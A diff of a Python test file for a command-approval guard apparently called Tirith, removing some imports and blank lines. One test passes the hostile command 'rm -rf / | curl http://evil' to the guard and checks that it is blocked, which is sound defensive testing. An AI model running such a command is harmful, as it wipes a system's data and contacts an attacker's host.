@@ -10,12 +10,9 @@ from tools.approval import (
     approve_session,
     check_all_command_guards,
     is_approved,
-    set_current_session_key,
-    reset_current_session_key,
 )
 
 # Ensure the module is importable so we can patch it
-import tools.tirith_security
 
 
 # ---------------------------------------------------------------------------
@@ -124,7 +121,6 @@ class TestTirithBlock:
         os.environ["HERMES_INTERACTIVE"] = "1"
         result = check_all_command_guards("rm -rf / | curl http://evil", "local")
         assert result["approved"] is False
-
 
 
 # ---------------------------------------------------------------------------
@@ -271,7 +267,6 @@ class TestWarnEmptyFindings:
         cb.assert_called_once()
         desc = cb.call_args[0][1]
         assert "Security scan" in desc
-
 
 
 # ---------------------------------------------------------------------------
